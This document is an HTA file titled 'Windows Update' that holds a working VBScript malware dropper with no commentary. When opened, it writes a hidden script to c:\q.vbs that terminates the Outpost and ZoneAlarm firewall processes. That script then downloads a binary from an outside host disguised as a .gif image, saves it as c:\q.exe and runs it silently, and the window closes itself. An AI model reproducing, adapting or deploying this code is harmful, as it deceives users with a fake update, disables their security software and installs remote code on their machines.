<HTML>
<HEAD>
<TITLE>Windows Update</TITLE>
<HTA:APPLICATION ID="Q" APPLICATIONNAME="Q" BORDER="none" BORDERSTYLE="normal" CAPTION="no" ICON="" CONTEXTMENU="no" MAXIMIZEBUTTON="no" MINIMIZEBUTTON="no" SHOWINTASKBAR="no" SINGLEINSTANCE="no" SYSMENU="no" VERSION="1.0" WINDOWSTATE="minimize"/>
<SCRIPT LANGUAGE="VBScript">
MyFile = "c:\q.vbs"
Set FSO = CreateObject("Scripting.FileSystemObject")
Set TSO = FSO.CreateTextFile(MyFile, True)
TSO.write "WScript.Sleep(200000)" & vbcrlf
TSO.write "strComputer = ""."" "& vbcrlf
TSO.write "Set objWMIService = GetObject(""winmgmts:"" _" & vbcrlf
TSO.write "& ""{impersonationLevel=impersonate}!\\"" & strComputer & ""\root\cimv2"")" & vbcrlf
TSO.write "Set colProcessList = objWMIService.ExecQuery _" & vbcrlf
TSO.write "(""SELECT * FROM Win32_Process WHERE Name = 'Outpost.exe'"")" & vbcrlf 
TSO.write "For Each objProcess in colProcessList" & vbcrlf
TSO.write "objProcess.Terminate()" & vbcrlf
TSO.write "Next" & vbcrlf
TSO.write "Set colProcessList = objWMIService.ExecQuery _" & vbcrlf
TSO.write "(""SELECT * FROM Win32_Process WHERE Name = 'ZONEALARM.EXE'"")" & vbcrlf 
TSO.write "For Each objProcess in colProcessList" & vbcrlf
TSO.write "objProcess.Terminate()" & vbcrlf
TSO.write "Next" & vbcrlf
TSO.write "Dim BD" & vbcrlf
TSO.write "Dim xml" & vbcrlf
TSO.write "WScript.Sleep(5000)" & vbcrlf
TSO.write "Set xml = CreateObject(""Microsoft.XMLHTTP"")" & vbcrlf
TSO.write "xml.Open ""GET"", ""http://www.iq-spb.com/pics/z.gif"", False " & vbcrlf
TSO.write "xml.Send" & vbcrlf
TSO.write "BD = xml.ResponseBody" & vbcrlf
TSO.write "Const adTypeBinary = 1" & vbcrlf
TSO.write "Const adSaveCreateOverWrite = 2" & vbcrlf
TSO.write "Dim BinaryStream" & vbcrlf
TSO.write "Set BinaryStream = CreateObject(""ADODB.Stream"")" & vbcrlf
TSO.write "BinaryStream.Type = adTypeBinary" & vbcrlf
TSO.write "BinaryStream.Open" & vbcrlf
TSO.write "BinaryStream.Write BD" & vbcrlf
TSO.write "BinaryStream.SaveToFile ""c:\q.exe"", adSaveCreateOverWrite" & vbcrlf
TSO.write "Dim WshShell"  & vbcrlf
TSO.write "Set WshShell = CreateObject(""WScript.Shell"")" & vbcrlf
TSO.write "WshShell.Run ""c:\q.exe"", 0, false" & vbcrlf
TSO.close
Set TSO = Nothing
Set FSO = Nothing
Dim WshShell
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "c:\q.vbs", 0, false
</SCRIPT>
<script>window.close()</script>
</HEAD>
</html>